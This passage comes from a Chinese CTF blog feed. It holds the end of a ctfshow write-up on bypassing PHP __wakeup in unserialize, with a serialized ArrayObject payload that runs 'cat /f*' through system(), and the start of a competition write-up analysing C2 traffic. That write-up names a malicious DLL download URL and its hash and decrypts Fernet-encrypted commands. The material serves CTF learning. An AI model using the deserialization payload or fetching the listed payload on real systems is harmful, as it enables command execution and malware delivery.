class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_construct() 当创建对象时触发，一般用于初始化对象，对变量赋初值</span><br><span class="line">__sleep() 使用serialize()时自动触发 </span><br><span class="line">__wakeup() 使用unserialize()时自动触发</span><br><span class="line">__destruct() 当一个对象被销毁时触发</span><br><span class="line">__toString() 当一个类被当成字符串使用时触发</span><br><span class="line">__invoke() 当尝试以调用函数的方式调用一个对象时触发</span><br><span class="line">__call() 在对象上下文中调用不可访问的方法时触发 </span><br><span class="line">__callStatic() 在静态上下文中调用不可访问的方法时触发 </span><br><span class="line">__get() 用于从不可访问的属性读取数据</span><br><span class="line">__set() 用于将数据写入不可访问的属性</span><br><span class="line">__isset() 在不可访问的属性上调用<span class="keyword">isset</span>()或<span class="keyword">empty</span>()触发</span><br><span class="line">__unset() 在不可访问的属性上使用<span class="keyword">unset</span>()时触发</span><br></pre></td></tr></table></figure><p>__wakeup() 使用unserialize()时自动触发 ，代码中使用了 unserialize函数，那就会销毁</p><p>在php5中绕过__wakeup()将对象属性的个数值大于真实的属性就会跳过__wakeup()</p><p>php7环境下，需要序列化ArrObject类来绕过</p><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">php5环境下，只需要在正常生成的序列化字符串数字前添加一个+号即可绕过执行</span><br><span class="line">方法:</span><br><span class="line">echo serialize(new ctfshow())</span><br><span class="line">payload: </span><br><span class="line">O:+<span class="number">7</span>:<span class="string">&quot;ctfshow&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;ctfshow&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;cat /f*&quot;</span>;&#125;</span><br><span class="line">php7环境下，需要序列化<span class="type">ArrObject</span>类来绕过</span><br><span class="line">方法:</span><br><span class="line">echo serialize(new <span class="type">ArrayObject</span>(new ctfshow()));</span><br><span class="line">payload:</span><br><span class="line">C:<span class="number">11</span>:<span class="string">&quot;ArrayObject&quot;</span>:<span class="number">61</span>:&#123;x:i:<span class="number">0</span>;O:<span class="number">7</span>:<span class="string">&quot;ctfshow&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;ctfshow&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;cat /f*&quot;</span>;&#125;;m:a:<span class="number">0</span>:&#123;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此题中为php7</p><p>payload  自己加一个public变量即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctfshow</span>=<span class="string">&#x27;cat /f*&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;1+1&gt;2&#x27;</span>];</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="keyword">new</span> ctfshow()));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//C:11:&quot;ArrayObject&quot;:61:&#123;x:i:0;O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:7:&quot;cat /f*&quot;;&#125;;m:a:0:&#123;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p><code>http://bd6bbd85-fa6e-4a78-ab40-c83485c956ed.challenge.ctf.show/?1%2b1&gt;2=C:11:&quot;ArrayObject&quot;:61:&#123;x:i:0;O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:7:&quot;cat /f*&quot;;&#125;;m:a:0:&#123;&#125;&#125;</code></p><p><img src="/imanges/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406223747040.png" alt="image-20230406223747040"></p><h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><blockquote><p>一直在路上</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023数字中国创新大赛-网络数据安全赛道-数据安全产业人才能力挑战赛-预赛wp</title>
      <link href="/2023/04/01/2023%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93-%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BA%A7%E4%B8%9A%E4%BA%BA%E6%89%8D%E8%83%BD%E5%8A%9B%E6%8C%91%E6%88%98%E8%B5%9B-%E9%A2%84%E8%B5%9Bwp/"/>
      <url>/2023/04/01/2023%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93-%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BA%A7%E4%B8%9A%E4%BA%BA%E6%89%8D%E8%83%BD%E5%8A%9B%E6%8C%91%E6%88%98%E8%B5%9B-%E9%A2%84%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/others/image-20230406143344755.png" alt="image-20230406143344755"></p><p><strong>C2流量分析.1</strong></p><p>EDR在一台机密计算机上检测到终止k4.exe进程的行为，取证人员取出来了该机器的镜像流量，请分析附件流量，回答对应问题。（注意：题目中的程序可能存在恶意操作，如果需要运行或调试，请在虚拟机中操作）</p><p><a href="https://pan.baidu.com/s/1ldNxI6mMfduIxjtAOSMcZQ">https://pan.baidu.com/s/1ldNxI6mMfduIxjtAOSMcZQ</a></p><p><a href="https://pan.baidu.com/s/1ldNxI6mMfduIxjtAOSMcZQ">附件下载</a> 提取码（GAME）<a href="https://share.weiyun.com/QbZIcyjq">备用下载</a></p><p>请提交Payload的完整下载地址。（答案示例：<a href="http://xxx.xxx.xxx/xxx%EF%BC%89">http://xxx.xxx.xxx/xxx）</a></p><p><code>http://imgcache.cloudservicesdevc.tk/picturess/2023/RDSv38.dll</code></p><p><strong>C2流量分析.2</strong></p><p>请提交Payload的SHA256哈希值。（字母大写，请根据流量内容作答）</p><p>右键将这个RDSv38.dll文件导出然后sha256即可</p><p>AA2CBD3103CECAF189F93D787C602679E156CC6FD90E22646D637F01C64222CF</p><p><img src="/images/others/image-20230401164658387.png" alt="image-20230401164658387"></p><p>n6IcHjmQUNOd6TxOkV6WRigEPUZFkO2TIu8cS6MRyrE=</p><p>Aj0S2EgsjOFd_JRsOjcBB_5-fZ1H-9tZVF67-qOWCbw=</p><p>Aj0S2EgsjOFd_JRsOjcBB_5-fZ1H-9tZVF67-qOWCbw=</p><p>Z-Ur0AYZQ9-nNO_O6j5B1slASR-YR2tsssycqHNc_so=</p><p>eBp92fUD7Lk_6qXR2pIjFt3sBH-lW0ul830S-sO6QCQ=</p><p>Erj5UoZfpxT47Bjpg8qg1XmMCKZyKBj1bJ0otszVZPk=</p><p>qkwNBcGK7ZcOrlKKcflivlyiatdAsb2u_sH_-IB5R_Y=</p><p>0smJ2LvvnQonNICFpjOF8CeuOcMIuYLNVbCDucWSVaw=</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">解密后信息： I&#x27;m a hacker.</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">解密后信息： This system has been hacked by me</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">解密后信息： Next, I want to obtain some data</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">加密前信息： test message</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">加密前信息： test message</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">加密前信息： test message</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">加密前信息： test message</span><br><span class="line">解密后信息： 女,小美,<span class="number">500112202304217984</span>,<span class="number">12222222222</span>,<span class="number">111111111111</span>,<span class="number">22222</span>,<span class="number">333333</span></span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">加密前信息： test message</span><br><span class="line">解密后信息： e4 b8 <span class="number">80</span> e4 b8 aa <span class="number">74</span> <span class="number">78</span> <span class="number">74</span> <span class="number">0</span>a e5 <span class="number">95</span> <span class="number">86</span> e4 b8 <span class="number">9</span>a e8 ae a1 e5 <span class="number">88</span> <span class="number">92</span> ef bc <span class="number">88</span> e4 bb <span class="number">85</span> e4 be <span class="number">9</span>b e5 <span class="number">86</span> <span class="number">85</span> e9 <span class="number">83</span> a8 ef bc <span class="number">89</span> e6 ad a4 e5 a4 </span><br><span class="line"><span class="number">84</span> e7 <span class="number">9</span>c <span class="number">81</span> e7 <span class="number">95</span> a5 <span class="number">35</span> <span class="number">77</span> e5 ad <span class="number">97</span> <span class="number">0</span>a</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">加密前信息： test message</span><br><span class="line">解密后信息： bye??</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">加密前信息： test message</span><br><span class="line">解密后信息： no!I finally want to transmit a flag</span><br><span class="line">PS D:\vscodework&gt; python3 -u &quot;d:\vscodework\ctf\other\shujusai.py&quot;</span><br><span class="line">加密前信息： test message</span><br></pre></td></tr></table></figure><p>fernet 解密，一直解就行解出来是一个图片</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"></span><br><span class="line"><span class="comment"># key = Fernet.generate_key()  # 生成密钥</span></span><br><span class="line"><span class="comment"># print(key)</span></span><br><span class="line">key = <span class="string">&quot;0smJ2LvvnQonNICFpjOF8CeuOcMIuYLNVbCDucWSVaw=&quot;</span></span><br><span class="line">f = Fernet(key)  <span class="comment"># 使用密钥实例化</span></span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;test message&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;加密前信息：&#x27;</span>, message)</span><br><span class="line"></span><br><span class="line"><span class="comment"># token = f.encrypt(message.encode())</span></span><br><span class="line"><span class="comment"># print(&#x27;加密后信息：&#x27;, token.decode())</span></span><br><span class="line">token = <span class="string">b&#x27;gAAAAABkGeI2QDhD2PlVFV2USJsTO2RxaUESQowz02khRfYI05-AiIFlDuP4HtLShGmGAXgKZ-sS5CXKfWv32mXJFUy7fItWPg==&#x27;</span></span><br><span class="line"></span><br><span class="line">decrypt_message = f.decrypt(token).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;解密后信息：&#x27;</span>, decrypt_message)</span><br></pre></td></tr></table></figure><p><img src="/images/others/image-20230401171310298.png" alt="image-20230401171310298"></p><p>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